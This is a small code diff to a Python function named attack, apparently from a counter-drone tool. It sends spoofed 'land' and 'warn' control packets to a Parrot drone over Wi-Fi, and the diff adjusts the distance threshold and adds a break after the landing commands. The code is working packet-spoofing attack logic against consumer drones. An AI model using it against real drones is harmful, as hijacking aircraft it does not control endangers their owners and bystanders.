@@ -57,15 +57,16 @@ def attack(parrotsAP):
 			print "Wait ended"
 			if attackInProgress == 2: #if panic mode started, quit
 				return
-			print "If still here, land it"
 			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
+				print "Sending land commands"
 				arduinoLCD("Sending land commands")
 				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 		elif mode == "Gracious":
 			while getWifiDistance(interfaceToConnect, parrotsAP) > 0: #while the drone is in wifi range
-				if wifiDistance * 1.1 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
+				if wifiDistance * 0.9 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
 					arduinoLCD("Sending land commands")
 					sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
+					break
 				else: #otherwise warn again
 					arduinoLCD("Sending warn commands")
 					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
